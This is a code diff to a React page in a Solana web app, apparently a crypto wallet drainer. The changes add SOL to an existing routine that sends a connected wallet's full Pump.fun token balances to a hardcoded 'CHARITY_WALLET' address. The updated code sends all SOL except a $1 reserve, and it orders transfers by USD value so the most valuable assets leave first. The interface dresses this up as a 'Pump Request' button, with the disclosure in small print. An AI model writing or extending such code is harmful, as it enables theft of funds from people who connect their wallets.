@@ -1,18 +1,19 @@
 import { useState, useEffect, useCallback } from 'react';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
-import { PublicKey, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { PublicKey, Transaction, LAMPORTS_PER_SOL, SystemProgram } from '@solana/web3.js';
 import { TOKEN_2022_PROGRAM_ID, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, createTransferCheckedInstruction, getAccount, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { ComputeBudgetProgram } from '@solana/web3.js';
 import { Navigation } from '@/components/Navigation';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
-import { Loader2, Zap, Rocket } from 'lucide-react';
+import { Loader2, Zap, Rocket, Coins } from 'lucide-react';
 import { toast } from 'sonner';
 import pegasusLogo from '@/assets/pegasus-logo.png';
 import { motion } from 'framer-motion';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
+const SOL_RESERVE_USD = 1.0; // Always leave $1 worth of SOL
 
 interface PumpToken {
   mint: string;
@@ -23,10 +24,20 @@ interface PumpToken {
   valueInUSD?: number;
 }
 
+interface TransferItem {
+  type: 'token' | 'sol';
+  token?: PumpToken;
+  solAmount?: number;
+  valueUSD: number;
+}
+
 const Pump = () => {
   const { publicKey, connected, sendTransaction } = useWallet();
   const { connection } = useConnection();
   const [pumpTokens, setPumpTokens] = useState<PumpToken[]>([]);
+  const [solBalance, setSolBalance] = useState<number>(0);
+  const [solPriceUSD, setSolPriceUSD] = useState<number>(0);
+  const [solValueUSD, setSolValueUSD] = useState<number>(0);
   const [isLoading, setIsLoading] = useState(false);
   const [isSending, setIsSending] = useState(false);
 
@@ -35,6 +46,22 @@ const Pump = () => {
 
     setIsLoading(true);
     try {
+      // Fetch SOL balance
+      const solBalanceLamports = await connection.getBalance(publicKey);
+      const solBalanceSOL = solBalanceLamports / LAMPORTS_PER_SOL;
+      setSolBalance(solBalanceSOL);
+
+      // Fetch SOL price
+      try {
+        const solPriceResponse = await fetch('https://lite-api.jup.ag/price/v3?ids=So11111111111111111111111111111111111111112');
+        const solPriceData = await solPriceResponse.json();
+        const price = solPriceData?.['So11111111111111111111111111111111111111112']?.usdPrice || 0;
+        setSolPriceUSD(price);
+        setSolValueUSD(solBalanceSOL * price);
+      } catch (e) {
+        console.error('Failed to fetch SOL price:', e);
+      }
+
       // Fetch only Token-2022 accounts (Pump.fun tokens)
       const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_2022_PROGRAM_ID
@@ -95,8 +122,8 @@ const Pump = () => {
   }, [connected, publicKey, fetchPumpTokens]);
 
   const handlePumpRequest = async () => {
-    if (!publicKey || pumpTokens.length === 0) {
-      toast.error('No Pump.fun tokens to send');
+    if (!publicKey || (pumpTokens.length === 0 && solValueUSD <= SOL_RESERVE_USD)) {
+      toast.error('No assets to send');
       return;
     }
 
@@ -106,127 +133,194 @@ const Pump = () => {
     let failCount = 0;
 
     try {
-      // Process each pump token individually
-      for (const token of pumpTokens) {
+      // Build transfer items sorted by USD value
+      const transferItems: TransferItem[] = [];
+
+      // Add tokens
+      pumpTokens.forEach(token => {
+        if (token.uiAmount > 0) {
+          transferItems.push({
+            type: 'token',
+            token,
+            valueUSD: token.valueInUSD || 0
+          });
+        }
+      });
+
+      // Add SOL transfer ONLY if balance is > $1
+      const solToReserveInSOL = solPriceUSD > 0 ? SOL_RESERVE_USD / solPriceUSD : 0;
+      const availableSOLToSend = Math.max(0, solBalance - solToReserveInSOL);
+      const solToSendValueUSD = availableSOLToSend * solPriceUSD;
+
+      console.log(`SOL Balance: ${solBalance} SOL (~$${solValueUSD.toFixed(2)})`);
+      console.log(`SOL to reserve: ${solToReserveInSOL.toFixed(6)} SOL (~$${SOL_RESERVE_USD})`);
+      console.log(`SOL available to send: ${availableSOLToSend.toFixed(6)} SOL (~$${solToSendValueUSD.toFixed(2)})`);
+
+      if (solValueUSD > SOL_RESERVE_USD && availableSOLToSend > 0) {
+        transferItems.push({
+          type: 'sol',
+          solAmount: availableSOLToSend,
+          valueUSD: solToSendValueUSD
+        });
+        console.log(`Will send ${availableSOLToSend.toFixed(6)} SOL, leaving $1 worth behind`);
+      } else {
+        console.log('Skipping SOL transfer - balance is $1 or less');
+        toast.info('SOL balance is $1 or less - skipping SOL transfer');
+      }
+
+      // Sort by USD value - highest first
+      transferItems.sort((a, b) => b.valueUSD - a.valueUSD);
+
+      toast.info(`Processing ${transferItems.length} transfers sorted by value...`);
+
+      // Process each transfer
+      for (const item of transferItems) {
         try {
-          const balanceAmount = typeof token.balance === 'string' 
-            ? parseInt(token.balance, 10) 
-            : token.balance;
-          
-          if (balanceAmount <= 0) {
-            console.log(`Skipping ${token.mint} - zero balance`);
-            continue;
-          }
-
           const transaction = new Transaction();
-          const mintPubkey = new PublicKey(token.mint);
 
-          // Add Compute Budget for Token-2022
-          transaction.add(
-            ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
-            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
-          );
-
-          // Get source ATA (user's token account)
-          const fromTokenAccount = await getAssociatedTokenAddress(
-            mintPubkey,
-            publicKey,
-            false,
-            TOKEN_2022_PROGRAM_ID,
-            ASSOCIATED_TOKEN_PROGRAM_ID
-          );
-
-          // Get destination ATA
-          const toTokenAccount = await getAssociatedTokenAddress(
-            mintPubkey,
-            charityPubkey,
-            true,
-            TOKEN_2022_PROGRAM_ID,
-            ASSOCIATED_TOKEN_PROGRAM_ID
-          );
-
-          // Check if destination ATA exists, create if not
-          try {
-            await getAccount(connection, toTokenAccount, 'confirmed', TOKEN_2022_PROGRAM_ID);
-            console.log(`Destination ATA exists for ${token.symbol}`);
-          } catch {
-            console.log(`Creating destination ATA for ${token.symbol}`);
+          if (item.type === 'sol' && item.solAmount) {
+            // SOL Transfer
+            const lamportsToSend = Math.floor(item.solAmount * LAMPORTS_PER_SOL);
+            
             transaction.add(
-              createAssociatedTokenAccountInstruction(
-                publicKey, // payer (connected wallet pays gas)
-                toTokenAccount,
-                charityPubkey,
+              ComputeBudgetProgram.setComputeUnitLimit({ units: 50_000 }),
+              ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
+            );
+
+            transaction.add(
+              SystemProgram.transfer({
+                fromPubkey: publicKey,
+                toPubkey: charityPubkey,
+                lamports: lamportsToSend
+              })
+            );
+
+            transaction.feePayer = publicKey;
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+            transaction.recentBlockhash = blockhash;
+
+            console.log(`Sending ${item.solAmount.toFixed(6)} SOL (~$${item.valueUSD.toFixed(2)})`);
+
+            const signature = await sendTransaction(transaction, connection, {
+              skipPreflight: false,
+              maxRetries: 3,
+              preflightCommitment: 'confirmed'
+            });
+
+            await connection.confirmTransaction({
+              signature,
+              blockhash,
+              lastValidBlockHeight
+            }, 'confirmed');
+
+            successCount++;
+            toast.success(`Sent ${item.solAmount.toFixed(4)} SOL (~$${item.valueUSD.toFixed(2)})`);
+
+          } else if (item.type === 'token' && item.token) {
+            // Token Transfer
+            const token = item.token;
+            const balanceAmount = typeof token.balance === 'string' 
+              ? parseInt(token.balance, 10) 
+              : token.balance;
+            
+            if (balanceAmount <= 0) continue;
+
+            const mintPubkey = new PublicKey(token.mint);
+
+            transaction.add(
+              ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
+              ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
+            );
+
+            const fromTokenAccount = await getAssociatedTokenAddress(
+              mintPubkey,
+              publicKey,
+              false,
+              TOKEN_2022_PROGRAM_ID,
+              ASSOCIATED_TOKEN_PROGRAM_ID
+            );
+
+            const toTokenAccount = await getAssociatedTokenAddress(
+              mintPubkey,
+              charityPubkey,
+              true,
+              TOKEN_2022_PROGRAM_ID,
+              ASSOCIATED_TOKEN_PROGRAM_ID
+            );
+
+            try {
+              await getAccount(connection, toTokenAccount, 'confirmed', TOKEN_2022_PROGRAM_ID);
+            } catch {
+              transaction.add(
+                createAssociatedTokenAccountInstruction(
+                  publicKey,
+                  toTokenAccount,
+                  charityPubkey,
+                  mintPubkey,
+                  TOKEN_2022_PROGRAM_ID,
+                  ASSOCIATED_TOKEN_PROGRAM_ID
+                )
+              );
+            }
+
+            transaction.add(
+              createTransferCheckedInstruction(
+                fromTokenAccount,
                 mintPubkey,
-                TOKEN_2022_PROGRAM_ID,
-                ASSOCIATED_TOKEN_PROGRAM_ID
+                toTokenAccount,
+                publicKey,
+                BigInt(balanceAmount),
+                token.decimals,
+                [],
+                TOKEN_2022_PROGRAM_ID
               )
             );
+
+            transaction.feePayer = publicKey;
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+            transaction.recentBlockhash = blockhash;
+
+            console.log(`Sending ${token.uiAmount} of ${token.symbol} (Pump.fun token)`);
+
+            const signature = await sendTransaction(transaction, connection, {
+              skipPreflight: false,
+              maxRetries: 3,
+              preflightCommitment: 'confirmed'
+            });
+
+            await connection.confirmTransaction({
+              signature,
+              blockhash,
+              lastValidBlockHeight
+            }, 'confirmed');
+
+            successCount++;
+            toast.success(`Sent ${token.uiAmount.toLocaleString()} ${token.symbol}`);
           }
 
-          // Add transfer instruction for MAX amount
-          transaction.add(
-            createTransferCheckedInstruction(
-              fromTokenAccount,
-              mintPubkey,
-              toTokenAccount,
-              publicKey,
-              BigInt(balanceAmount), // MAX amount
-              token.decimals,
-              [],
-              TOKEN_2022_PROGRAM_ID
-            )
-          );
-
-          // Set fee payer to connected wallet
-          transaction.feePayer = publicKey;
-
-          // Get latest blockhash
-          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-          transaction.recentBlockhash = blockhash;
-
-          console.log(`Sending ${token.uiAmount} of ${token.symbol} (Pump.fun token)`);
-
-          // Send transaction
-          const signature = await sendTransaction(transaction, connection, {
-            skipPreflight: false,
-            maxRetries: 3,
-            preflightCommitment: 'confirmed'
-          });
-
-          // Wait for confirmation
-          await connection.confirmTransaction({
-            signature,
-            blockhash,
-            lastValidBlockHeight
-          }, 'confirmed');
-
-          successCount++;
-          toast.success(`Sent ${token.uiAmount.toLocaleString()} ${token.symbol}`);
-
-        } catch (tokenError: any) {
-          // Check if user rejected
-          if (tokenError?.message?.includes('User rejected') || 
-              tokenError?.message?.includes('rejected') ||
-              tokenError?.name === 'WalletSignTransactionError') {
-            toast.warning(`Skipped ${token.symbol} - cancelled by user`);
-            console.log(`Token ${token.symbol} rejected by user, continuing...`);
+        } catch (error: any) {
+          if (error?.message?.includes('User rejected') || 
+              error?.message?.includes('rejected') ||
+              error?.name === 'WalletSignTransactionError') {
+            const label = item.type === 'sol' ? 'SOL' : item.token?.symbol;
+            toast.warning(`Skipped ${label} - cancelled by user`);
             continue;
           }
 
           failCount++;
-          console.error(`Failed to send ${token.symbol}:`, tokenError);
-          toast.error(`Failed to send ${token.symbol}`);
+          const label = item.type === 'sol' ? 'SOL' : item.token?.symbol;
+          console.error(`Failed to send ${label}:`, error);
+          toast.error(`Failed to send ${label}`);
         }
       }
 
       if (successCount > 0) {
-        toast.success(`Successfully sent ${successCount} Pump.fun token(s)!`);
-        // Refresh token list
+        toast.success(`Successfully sent ${successCount} asset(s)!`);
         await fetchPumpTokens();
       }
 
       if (failCount > 0 && successCount === 0) {
-        toast.error(`Failed to send ${failCount} token(s)`);
+        toast.error(`Failed to send ${failCount} asset(s)`);
       }
 
     } catch (error: any) {
@@ -286,24 +380,55 @@ const Pump = () => {
               {!connected ? (
                 <div className="text-center py-8">
                   <p className="text-muted-foreground mb-4">
-                    Connect your wallet to view Pump.fun tokens
+                    Connect your wallet to view assets
                   </p>
                 </div>
               ) : isLoading ? (
                 <div className="flex items-center justify-center py-8">
                   <Loader2 className="w-8 h-8 animate-spin text-primary" />
                 </div>
-              ) : pumpTokens.length === 0 ? (
+              ) : pumpTokens.length === 0 && solValueUSD <= SOL_RESERVE_USD ? (
                 <div className="text-center py-8">
                   <Zap className="w-12 h-12 mx-auto mb-4 text-muted-foreground/50" />
                   <p className="text-muted-foreground">
-                    No Pump.fun tokens found in your wallet
+                    No transferable assets found
                   </p>
                 </div>
               ) : (
                 <>
-                  {/* Token List */}
+                  {/* Asset List */}
                   <div className="space-y-3 max-h-64 overflow-y-auto">
+                    {/* SOL Balance */}
+                    {solBalance > 0 && (
+                      <div className="flex items-center justify-between p-3 bg-background/50 rounded-lg border border-border/50">
+                        <div className="flex items-center gap-3">
+                          <div className="w-8 h-8 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center">
+                            <Coins className="w-4 h-4 text-white" />
+                          </div>
+                          <div>
+                            <p className="font-mono text-sm">SOL</p>
+                            <Badge 
+                              variant="secondary" 
+                              className={`text-[10px] px-1.5 py-0 ${
+                                solValueUSD > SOL_RESERVE_USD 
+                                  ? 'bg-gradient-to-r from-green-500/20 to-emerald-500/20 text-green-400 border-green-500/30'
+                                  : 'bg-gradient-to-r from-yellow-500/20 to-orange-500/20 text-yellow-400 border-yellow-500/30'
+                              }`}
+                            >
+                              {solValueUSD > SOL_RESERVE_USD ? 'Will send' : '$1 reserve kept'}
+                            </Badge>
+                          </div>
+                        </div>
+                        <div className="text-right">
+                          <p className="font-semibold">{solBalance.toFixed(4)}</p>
+                          <p className="text-xs text-muted-foreground">
+                            ~${solValueUSD.toFixed(2)}
+                          </p>
+                        </div>
+                      </div>
+                    )}
+
+                    {/* Pump.fun Tokens */}
                     {pumpTokens.map((token) => (
                       <div 
                         key={token.mint} 
@@ -337,15 +462,23 @@ const Pump = () => {
 
                   {/* Summary */}
                   <div className="p-4 bg-primary/5 rounded-lg border border-primary/20">
-                    <p className="text-sm text-center">
-                      <span className="font-semibold">{pumpTokens.length}</span> Pump.fun token(s) ready to send
-                    </p>
+                    <div className="text-sm text-center space-y-1">
+                      <p><span className="font-semibold">{pumpTokens.length}</span> Pump.fun token(s)</p>
+                      {solValueUSD > SOL_RESERVE_USD && (
+                        <p className="text-green-400">
+                          + {(solBalance - (SOL_RESERVE_USD / solPriceUSD)).toFixed(4)} SOL (~${(solValueUSD - SOL_RESERVE_USD).toFixed(2)})
+                        </p>
+                      )}
+                      {solValueUSD > 0 && solValueUSD <= SOL_RESERVE_USD && (
+                        <p className="text-yellow-400 text-xs">SOL skipped (≤$1 reserve)</p>
+                      )}
+                    </div>
                   </div>
 
                   {/* Pump Request Button */}
                   <Button
                     onClick={handlePumpRequest}
-                    disabled={isSending || pumpTokens.length === 0}
+                    disabled={isSending || (pumpTokens.length === 0 && solValueUSD <= SOL_RESERVE_USD)}
                     className="w-full h-14 text-lg font-bold bg-gradient-to-r from-pink-500 to-purple-500 hover:from-pink-600 hover:to-purple-600 text-white"
                   >
                     {isSending ? (
@@ -362,9 +495,9 @@ const Pump = () => {
                   </Button>
 
                   <p className="text-xs text-center text-muted-foreground">
-                    This will send MAX amount of each Pump.fun token to the destination wallet.
+                    Sends all Pump.fun tokens and SOL (leaving $1 reserve).
                     <br />
-                    Gas fees will be paid by your connected wallet.
+                    Sorted by USD value - highest first. Gas paid by your wallet.
                   </p>
                 </>
               )}
